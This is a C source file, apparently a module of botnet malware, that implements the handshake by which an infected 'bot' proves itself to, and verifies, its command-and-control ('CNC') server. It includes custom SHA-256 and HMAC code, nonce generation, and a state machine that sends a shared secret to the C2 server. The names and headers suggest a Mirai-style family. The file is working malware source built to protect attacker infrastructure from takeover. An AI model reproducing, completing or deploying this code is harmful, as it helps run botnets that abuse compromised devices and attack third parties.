#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/random.h>

#include "headers/mutual_auth.h"
#include "headers/hkdf.h"
#include "headers/keyguard.h"
#include "headers/table.h"

#ifdef DEBUG
#include <stdio.h>
#define DEBUG_PRINT(fmt, ...) printf("[DEBUG][mutual_auth] " fmt "\n", ##__VA_ARGS__)
#else
#define DEBUG_PRINT(fmt, ...)
#endif

#define SHA256_BLOCK_SIZE 64
#define SHA256_DIGEST_SIZE 32

typedef struct {
    uint32_t state[8];
    uint64_t count;
    uint8_t buffer[SHA256_BLOCK_SIZE];
} sha256_auth_ctx;

static const uint32_t SHA256_K[64] = {
    0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5,
    0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
    0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3,
    0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
    0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc,
    0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
    0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7,
    0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
    0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13,
    0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
    0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3,
    0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
    0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5,
    0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
    0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208,
    0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2
};

#define ROTR32_AUTH(x, n) (((x) >> (n)) | ((x) << (32 - (n))))
#define CH_AUTH(x, y, z)  (((x) & (y)) ^ (~(x) & (z)))
#define MAJ_AUTH(x, y, z) (((x) & (y)) ^ ((x) & (z)) ^ ((y) & (z)))
#define EP0_AUTH(x)  (ROTR32_AUTH(x, 2) ^ ROTR32_AUTH(x, 13) ^ ROTR32_AUTH(x, 22))
#define EP1_AUTH(x)  (ROTR32_AUTH(x, 6) ^ ROTR32_AUTH(x, 11) ^ ROTR32_AUTH(x, 25))
#define SIG0_AUTH(x) (ROTR32_AUTH(x, 7) ^ ROTR32_AUTH(x, 18) ^ ((x) >> 3))
#define SIG1_AUTH(x) (ROTR32_AUTH(x, 17) ^ ROTR32_AUTH(x, 19) ^ ((x) >> 10))

static void sha256_auth_init(sha256_auth_ctx *ctx) {
    ctx->state[0] = 0x6a09e667;
    ctx->state[1] = 0xbb67ae85;
    ctx->state[2] = 0x3c6ef372;
    ctx->state[3] = 0xa54ff53a;
    ctx->state[4] = 0x510e527f;
    ctx->state[5] = 0x9b05688c;
    ctx->state[6] = 0x1f83d9ab;
    ctx->state[7] = 0x5be0cd19;
    ctx->count = 0;
}

static void sha256_auth_transform(sha256_auth_ctx *ctx, const uint8_t *data) {
    uint32_t a, b, c, d, e, f, g, h, t1, t2, m[64];
    int i;

    for (i = 0; i < 16; i++) {
        m[i] = ((uint32_t)data[i * 4] << 24) |
               ((uint32_t)data[i * 4 + 1] << 16) |
               ((uint32_t)data[i * 4 + 2] << 8) |
               ((uint32_t)data[i * 4 + 3]);
    }
    for (i = 16; i < 64; i++) {
        m[i] = SIG1_AUTH(m[i - 2]) + m[i - 7] + SIG0_AUTH(m[i - 15]) + m[i - 16];
    }

    a = ctx->state[0]; b = ctx->state[1]; c = ctx->state[2]; d = ctx->state[3];
    e = ctx->state[4]; f = ctx->state[5]; g = ctx->state[6]; h = ctx->state[7];

    for (i = 0; i < 64; i++) {
        t1 = h + EP1_AUTH(e) + CH_AUTH(e, f, g) + SHA256_K[i] + m[i];
        t2 = EP0_AUTH(a) + MAJ_AUTH(a, b, c);
        h = g; g = f; f = e; e = d + t1;
        d = c; c = b; b = a; a = t1 + t2;
    }

    ctx->state[0] += a; ctx->state[1] += b; ctx->state[2] += c; ctx->state[3] += d;
    ctx->state[4] += e; ctx->state[5] += f; ctx->state[6] += g; ctx->state[7] += h;
}

static void sha256_auth_update(sha256_auth_ctx *ctx, const uint8_t *data, size_t len) {
    size_t i;
    size_t idx = (size_t)(ctx->count & 0x3F);
    ctx->count += len;

    for (i = 0; i < len; i++) {
        ctx->buffer[idx++] = data[i];
        if (idx == SHA256_BLOCK_SIZE) {
            sha256_auth_transform(ctx, ctx->buffer);
            idx = 0;
        }
    }
}

static void sha256_auth_final(sha256_auth_ctx *ctx, uint8_t *digest) {
    size_t i;
    size_t idx = (size_t)(ctx->count & 0x3F);
    uint64_t bits = ctx->count * 8;

    ctx->buffer[idx++] = 0x80;
    if (idx > 56) {
        while (idx < 64) ctx->buffer[idx++] = 0;
        sha256_auth_transform(ctx, ctx->buffer);
        idx = 0;
    }
    while (idx < 56) ctx->buffer[idx++] = 0;

    for (i = 0; i < 8; i++) {
        ctx->buffer[56 + i] = (uint8_t)(bits >> (56 - i * 8));
    }
    sha256_auth_transform(ctx, ctx->buffer);

    for (i = 0; i < 8; i++) {
        digest[i * 4] = (uint8_t)(ctx->state[i] >> 24);
        digest[i * 4 + 1] = (uint8_t)(ctx->state[i] >> 16);
        digest[i * 4 + 2] = (uint8_t)(ctx->state[i] >> 8);
        digest[i * 4 + 3] = (uint8_t)(ctx->state[i]);
    }
    secure_memzero(ctx, sizeof(sha256_auth_ctx));
}

static void hmac_sha256_auth(const uint8_t *key, size_t key_len,
                              const uint8_t *data, size_t data_len,
                              uint8_t *mac) {
    sha256_auth_ctx ctx;
    uint8_t k_ipad[SHA256_BLOCK_SIZE];
    uint8_t k_opad[SHA256_BLOCK_SIZE];
    uint8_t tk[SHA256_DIGEST_SIZE];
    uint8_t inner_hash[SHA256_DIGEST_SIZE];
    size_t i;

    if (key_len > SHA256_BLOCK_SIZE) {
        sha256_auth_ctx hash_ctx;
        sha256_auth_init(&hash_ctx);
        sha256_auth_update(&hash_ctx, key, key_len);
        sha256_auth_final(&hash_ctx, tk);
        key = tk;
        key_len = SHA256_DIGEST_SIZE;
    }

    memset(k_ipad, 0x36, SHA256_BLOCK_SIZE);
    memset(k_opad, 0x5c, SHA256_BLOCK_SIZE);

    for (i = 0; i < key_len; i++) {
        k_ipad[i] ^= key[i];
        k_opad[i] ^= key[i];
    }

    sha256_auth_init(&ctx);
    sha256_auth_update(&ctx, k_ipad, SHA256_BLOCK_SIZE);
    sha256_auth_update(&ctx, data, data_len);
    sha256_auth_final(&ctx, inner_hash);

    sha256_auth_init(&ctx);
    sha256_auth_update(&ctx, k_opad, SHA256_BLOCK_SIZE);
    sha256_auth_update(&ctx, inner_hash, SHA256_DIGEST_SIZE);
    sha256_auth_final(&ctx, mac);

    secure_memzero(k_ipad, sizeof(k_ipad));
    secure_memzero(k_opad, sizeof(k_opad));
    secure_memzero(inner_hash, sizeof(inner_hash));
    secure_memzero(tk, sizeof(tk));
}

void auth_init(auth_context_t *ctx) {
    memset(ctx, 0, sizeof(auth_context_t));
    ctx->state = AUTH_STATE_INIT;
    
    keyguard_get_key(ctx->session_key);
    DEBUG_PRINT("Auth context initialized");
}

int auth_generate_nonce(uint8_t *nonce) {
#ifdef SYS_getrandom
    ssize_t ret = getrandom(nonce, AUTH_NONCE_LEN, 0);
    if (ret == AUTH_NONCE_LEN) {
        return 0;
    }
#endif

    int fd = open("/dev/urandom", O_RDONLY);
    if (fd < 0) {
        DEBUG_PRINT("Failed to open /dev/urandom");
        return -1;
    }
    
    ssize_t bytes_read = read(fd, nonce, AUTH_NONCE_LEN);
    close(fd);
    
    if (bytes_read != AUTH_NONCE_LEN) {
        DEBUG_PRINT("Failed to read random bytes");
        return -1;
    }
    
    return 0;
}

void auth_compute_hmac(const uint8_t *key, const uint8_t *data, size_t data_len, uint8_t *hmac) {
    hmac_sha256_auth(key, 16, data, data_len, hmac);
}

int auth_verify_hmac(const uint8_t *key, const uint8_t *data, size_t data_len, const uint8_t *expected_hmac) {
    DEBUG_PRINT("auth_verify_hmac called");
    DEBUG_PRINT("key=%p, data=%p, expected_hmac=%p", (void*)key, (void*)data, (void*)expected_hmac);
    DEBUG_PRINT("data_len=%zu", data_len);
    
    uint8_t computed_hmac[AUTH_HMAC_LEN];
    DEBUG_PRINT("About to call hmac_sha256_auth");
    
    hmac_sha256_auth(key, 16, data, data_len, computed_hmac);
    DEBUG_PRINT("hmac_sha256_auth returned");
    
    uint8_t diff = 0;
    for (int i = 0; i < AUTH_HMAC_LEN; i++) {
        diff |= computed_hmac[i] ^ expected_hmac[i];
    }
    
    secure_memzero(computed_hmac, sizeof(computed_hmac));
    return (diff == 0) ? 0 : -1;
}

int auth_create_hello(auth_context_t *ctx, uint8_t *buffer) {
    if (ctx->state != AUTH_STATE_INIT) {
        DEBUG_PRINT("Invalid state for HELLO: %d", ctx->state);
        return -1;
    }
    
    if (auth_generate_nonce(ctx->bot_nonce) != 0) {
        DEBUG_PRINT("Failed to generate bot nonce");
        return -1;
    }
    
    buffer[0] = CMD_HELLO;
    memcpy(buffer + 1, ctx->bot_nonce, AUTH_NONCE_LEN);
    
    ctx->state = AUTH_STATE_HELLO_SENT;
    DEBUG_PRINT("HELLO message created");
    
    return 1 + AUTH_NONCE_LEN;
}

int auth_process_challenge(auth_context_t *ctx, const uint8_t *data, size_t data_len) {
    if (data_len < 1 + AUTH_NONCE_LEN + AUTH_HMAC_LEN) {
        DEBUG_PRINT("Challenge message too short: %zu", data_len);
        return -1;
    }
    
    if (data[0] != CMD_CHALLENGE) {
        DEBUG_PRINT("Invalid challenge command: 0x%02X", data[0]);
        return -1;
    }
    
    if (ctx->state != AUTH_STATE_HELLO_SENT) {
        DEBUG_PRINT("Invalid state for CHALLENGE: %d", ctx->state);
        return -1;
    }
    
    memcpy(ctx->cnc_nonce, data + 1, AUTH_NONCE_LEN);

    DEBUG_PRINT("About to verify HMAC");
    DEBUG_PRINT("session_key[0]=0x%02X, bot_nonce[0]=0x%02X", 
            ctx->session_key[0], ctx->bot_nonce[0]);
    
    const uint8_t *received_hmac = data + 1 + AUTH_NONCE_LEN;
    if (auth_verify_hmac(ctx->session_key, ctx->bot_nonce, AUTH_NONCE_LEN, received_hmac) != 0) {
        DEBUG_PRINT("HMAC verification failed - possible MITM attack!");
        ctx->state = AUTH_STATE_FAILED;
        return -1;
    }
    
    ctx->state = AUTH_STATE_CHALLENGE_RECEIVED;
    DEBUG_PRINT("Challenge verified successfully");
    return 0;
}

int auth_create_response(auth_context_t *ctx, const char *secret, size_t secret_len, uint8_t *buffer, size_t buffer_len) {
    size_t required_len = 1 + AUTH_HMAC_LEN + 1 + secret_len;
    
    if (buffer_len < required_len) {
        DEBUG_PRINT("Buffer too small: %zu < %zu", buffer_len, required_len);
        return -1;
    }
    
    if (ctx->state != AUTH_STATE_CHALLENGE_RECEIVED) {
        DEBUG_PRINT("Invalid state for RESPONSE: %d", ctx->state);
        return -1;
    }
    
    if (secret_len > AUTH_SECRET_MAX_LEN) {
        secret_len = AUTH_SECRET_MAX_LEN;
    }
    
    buffer[0] = CMD_AUTH_RESPONSE;
    
    auth_compute_hmac(ctx->session_key, ctx->cnc_nonce, AUTH_NONCE_LEN, buffer + 1);
    
    buffer[1 + AUTH_HMAC_LEN] = (uint8_t)secret_len;
    memcpy(buffer + 1 + AUTH_HMAC_LEN + 1, secret, secret_len);
    
    ctx->state = AUTH_STATE_RESPONSE_SENT;
    DEBUG_PRINT("Auth response created");
    
    return (int)required_len;
}

int auth_process_auth_ok(auth_context_t *ctx, const uint8_t *data, size_t data_len) {
    if (data_len < 1) {
        return -1;
    }
    
    if (ctx->state != AUTH_STATE_RESPONSE_SENT) {
        DEBUG_PRINT("Invalid state for AUTH_OK: %d", ctx->state);
        return -1;
    }
    
    if (data[0] == CMD_AUTH_OK) {
        ctx->state = AUTH_STATE_AUTHENTICATED;
        DEBUG_PRINT("Mutual authentication successful!");
        return 0;
    } else if (data[0] == CMD_AUTH_FAIL) {
        ctx->state = AUTH_STATE_FAILED;
        DEBUG_PRINT("Authentication failed (rejected by CNC)");
        return -1;
    }
    
    return -1;
}

void auth_cleanup(auth_context_t *ctx) {
    secure_memzero(ctx->bot_nonce, AUTH_NONCE_LEN);
    secure_memzero(ctx->cnc_nonce, AUTH_NONCE_LEN);
    secure_memzero(ctx->session_key, 16);
    ctx->state = AUTH_STATE_INIT;
    DEBUG_PRINT("Auth context cleaned up");
}
